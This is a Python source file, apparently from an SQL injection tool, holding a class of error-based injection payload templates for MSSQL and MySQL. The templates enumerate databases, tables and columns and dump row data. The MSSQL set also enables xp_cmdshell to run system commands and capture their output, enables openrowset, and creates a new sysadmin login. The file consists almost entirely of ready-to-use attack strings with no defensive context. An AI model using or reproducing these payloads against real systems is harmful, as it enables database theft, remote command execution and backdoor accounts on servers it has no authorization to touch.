#MSSQL ERROR-BASED query strings
#${...} - query variables

class error_based():

#==================================================MSSQL==================================================
    mssql = {
#-----------------------------[DATABASES]---------------------------
#Current database name
    "curr_db_name" : "(select ${MS}+cast(db_name() as varchar)+${MS})", 
#Count of databases
    "dbs_count" : "(select top 1 ${MS}+cast(count(*) as varchar)+${MS} from master..sysdatabases)", 
#Getting databases - not in(array) method
    "get_db_name" : "(isnull((select top 1 ${MS}+cast(name as varchar)+${MS} from master..sysdatabases where name not"\
    " in(''${current_db})), 0x7e69736e756c6c7e))", 
#Getting databases - not in(substring) method
    "get_db_name2" : "(isnull((select top 1 ${MS}+cast(name as varchar)+${MS} from master..sysdatabases where name not"\
    " in(select top ${num} name from master..sysdatabases)), 0x7e69736e756c6c7e))", 
#------------------------------[TABLES]--------------------------------
#Count of tables
    "tbls_count" : "(select top 1 ${MS}+cast(count(*) as varchar)+${MS} from [${current_db}].information_schema.tables)", 
#Getting tables, method - not in(array)
    "get_tbl_name" : "(isnull((select top 1 ${MS}+cast(table_name as varchar)+${MS} from [${current_db}].information_schema.tables"\
    " where table_name not in(''${current_table})), 0x7e69736e756c6c7e))", 
#Getting tables, method - not in(substring)
    "get_tbl_name2" : "(select top 1 ${MS}+cast(table_name as varchar)+${MS} from [${current_db}].information_schema.tables" \
    " where table_name not in(select top ${num} table_name from [${current_db}].information_schema.tables))", 
#-----------------------------[COLUMNS]-------------------------------
#Getting columns, method - not in(array)
    "get_column_name" : "(isnull((select top 1 ${MS}+cast(column_name as varchar)+${MS} from [${current_db}].information_schema.columns"\
    " where table_name=${current_table} and column_name not in(''${current_column})), 0x7e69736e756c6c7e))", 
#Count of columns in current table
    "columns_count" : "(select top 1 ${MS}+cast(count(*) as varchar)+${MS} from [${current_db}].information_schema.columns"\
    " where table_name=${current_table})", 
#Getting columns, method - not in(substring)
    "get_column_name2" : "(select top 1 ${MS}+cast(column_name as varchar)+${MS} from [${current_db}].information_schema.columns"\
    " where table_name=${current_table} and column_name not in(select top ${num} column_name from [${current_db}].information_schema.columns" \
    " where table_name=${current_table}))", 
#Gettin golumns by ordinal_position
    "get_column_name3" : "(select top 1 ${MS}+cast(column_name as varchar)+${MS} from [${current_db}].information_schema.columns"\
    " where table_name=${current_table} and ordinal_position=${num})", 
#---------------------------[XP_CMDSHELL]-----------------------------
#Enabling master..xp_cmdshell
    "enable_xp_cmdshell" : 'exec sp_configure "show advanced options",1;reconfigure;exec sp_configure "xp_cmdshell",1;reconfigure;', 
#Drop temp table
    "drop_tmp_tbl" : "drop table xtmptable", 
#Create temp table
    "create_tmp_tbl" : "create table xtmptable (num int identity,result varchar(8000) NULL,primary key(num))", 
#Insert xp_cmdshell output to temp table
    "insert_result" : "declare @cmd_hex varchar(8000) select @cmd_hex=${cmd_hex};insert xtmptable exec master..xp_cmdshell @cmd_hex", 
#Exec xp_cmdshell encoded
    "exec_cmdshell" : "declare @cmd_hex varchar(8000) select @cmd_hex=${cmd_hex};exec master..xp_cmdshell @cmd_hex", 
#Get count of rows from temp table
    "tmp_count" : "(select top 1 ${MS}+cast(count(*) as varchar)+${MS} from xtmptable)", 
#Get string from temp table by row number
    "get_row" : "(select top 1 isnull(${MS}+result+${MS}, 0x7e207e) from xtmptable where num=${num})", 
#---------------------------------[ETC]--------------------------------
#Get count of rows in selected table
    "rows_count" : "(select top 1 ${MS}+cast(count(*) as varchar)+${MS} from [${current_db}]..[${selected_table}])", 
#Query db
    "query" : "(select top 1 convert(int,${MS}+cast((${query_cmd}) as varchar)+${MS}))", 
#Enabling openrowset function
    "enable_openrowset" : 'exec sp_configure "show advanced options",1;reconfigure;exec sp_configure "Ad Hoc Distributed Queries",1;reconfigure', 
#Add mssql admin user
    "add_sqladmin" : 'exec master..sp_addlogin "${login}", "${password}";exec master..sp_addsrvrolemember "${login}", "sysadmin"', 
#String for data dump
    "data_dump" : "(isnull((select top 1 convert(int,${MS}+cast((select ${column} from [${current_db}]..[${table}]"\
    " where ${key}=${num} and len(${column})>=1) as varchar)+${MS})),0x4e554c4c))"}

#==================================================MySQL==================================================
    mysql = {
#-----------------------------[DATABASES]---------------------------
#Current database name
    "curr_db_name" : "(select 1 from(select count(*),concat((concat(${MS},(select database()),${MS})),floor(rand(0)*2))x"\
    " from information_schema.tables group by x)a)", 
#Count of databases
    "dbs_count" :  "(select 1 from(select count(*),concat((concat(${MS},(select count(*) from mysql.db),${MS})),floor(rand(0)*2))x"\
    " from information_schema.tables group by x)a)",
#Getting databases not in (array) method
    "get_db_name" : "(select 1 from(select count(*),concat((concat(${MS},IFNULL((select db from mysql.db where db not"\
    " in(''${current_db})),char(105,115,110,117,108,108)),${MS})),floor(rand(0)*2))x from information_schema.tables group by x)a)", 
#Getting databases LIMIT method
    "get_db_name2" : "(select 1 from(select count(*),concat((concat(${MS},(select db from mysql.db limit ${num},1),${MS})),floor(rand(0)*2))x"\
    " from information_schema.tables group by x)a)", 
#------------------------------[TABLES]--------------------------------
#Count of tables
    "tbls_count" : "(select 1 from(select count(*),concat((concat(${MS},(select count(*) from information_schema.tables where table_schema="\
    "${current_db}),${MS})),floor(rand(0)*2))x from information_schema.tables group by x)a)", 
#Getting tables, method - not in(array)
    "get_tbl_name" : "(select 1 from(select count(*),concat((concat(${MS},IFNULL((select table_name from information_schema.tables where table_schema="\
     "${current_db} and table_name not in(''${current_table})),char(105,115,110,117,108,108)),${MS})),floor(rand(0)*2))x"\
     " from information_schema.tables group by x)a)", 
#Getting tables, method - LIMIT
    "get_tbl_name2" : "(select 1 from(select count(*),concat((concat(${MS},(select table_name from information_schema.tables where table_schema="\
    "${current_db} limit ${num},1),${MS})),floor(rand(0)*2))x from information_schema.tables group by x)a)", 
#-----------------------------[COLUMNS]-------------------------------
#Count of columns in current table
    "columns_count" : "(select 1 from(select count(*),concat((concat(${MS},(select count(*) from information_schema.columns where table_schema="\
    "${current_db} and table_name=${current_table}),${MS})),floor(rand(0)*2))x from information_schema.tables group by x)a)", 
#Getting columns - LIMIT method
    "get_column_name2" : "(select 1 from(select count(*),concat((concat(${MS},(select column_name from information_schema.columns where table_schema="\
    "${current_db} and table_name=${current_table} limit ${num},1),${MS})),floor(rand(0)*2))x from information_schema.tables group by x)a)", 
#Getting columns by ordinal_position
    "get_column_name3" : "(select 1 from(select count(*),concat((concat(${MS},(select column_name from information_schema.columns where table_schema="\
    "${current_db} and table_name=${current_table} and ordinal_position=${num}),${MS})),floor(rand(0)*2))x from information_schema.tables group by x)a)", 
#---------------------------------[ETC]--------------------------------
#Get count of rows in selected table
    "rows_count" : "(select 1 from(select count(*),concat((concat(${MS},(select count(*) from ${current_db}.${selected_table}),${MS})),floor(rand(0)*2))x"\
    " from information_schema.tables group by x)a)", 
#Query db
    "query" : "(select 1 from(select count(*),concat((concat(${MS},(${query_cmd}),${MS})),floor(rand(0)*2))x from information_schema.tables group by x)a)" }
